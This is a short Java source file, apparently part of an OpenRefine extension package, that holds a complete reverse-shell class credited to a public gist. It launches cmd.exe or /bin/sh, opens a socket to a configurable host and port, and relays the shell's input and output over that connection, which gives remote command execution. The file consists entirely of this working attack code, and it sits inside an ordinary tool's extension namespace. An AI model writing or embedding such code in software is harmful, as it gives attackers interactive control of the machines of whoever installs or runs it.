package com.google.refine.whiteoakExtension;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.Thread;
import java.net.Socket;

public class ReverseShell {
	//Java R Shell from https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
	static public int shellyShell() throws Exception{
		String host="localhost";	// change me
		int port= 9999;			// change me
		String cmd = "";
		System.out.println("OS: " + System.getProperty("os.name"));
		if (System.getProperty("os.name").toLowerCase().contains("windows"))
			cmd = "cmd.exe";
		else cmd = "/bin/sh";

		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
		Socket s=new Socket(host,port);
		InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
		OutputStream po=p.getOutputStream(),so=s.getOutputStream();
		while(!s.isClosed()){
			while(pi.available()>0)so.write(pi.read());
			while(pe.available()>0)so.write(pe.read());
			while(si.available()>0)po.write(si.read());
			so.flush();
			po.flush();
			Thread.sleep(50);
			try {
				p.exitValue();break;
			}
			catch (Exception e){}
		};
		p.destroy();
		s.close();
		return 0;	
	}
}
